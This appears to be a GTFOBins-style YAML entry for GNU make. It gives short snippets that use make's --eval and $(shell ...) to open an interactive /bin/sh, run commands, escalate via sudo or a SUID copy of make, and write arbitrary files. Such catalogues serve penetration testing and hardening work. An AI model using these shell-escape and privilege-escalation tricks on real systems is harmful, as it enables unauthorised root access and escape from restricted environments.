---
functions:
  execute-interactive:
    - code: |
        COMMAND='/bin/sh 1>&2'
        make -s --eval="a := \$(info \$(shell $COMMAND))" --eval='all:'
  execute-non-interactive:
    - code: |
        COMMAND=/usr/bin/id
        make -s --eval="a := \$(info \$(shell $COMMAND))" --eval='all:'
  sudo-enabled:
    - code: |
        COMMAND=/usr/bin/id
        sudo make -s --eval="a := \$(info \$(shell $COMMAND))" --eval='all:'
  suid-enabled:
    - code: |
        COMMAND=/usr/bin/id
        ./make -s --eval="a := \$(info \$(shell $COMMAND))" --eval='all:'
  file-write:
    - code: |
        LFILE=file_to_write
        make -s --eval="a := \$(file >$LFILE,data)" --eval='all:'
---
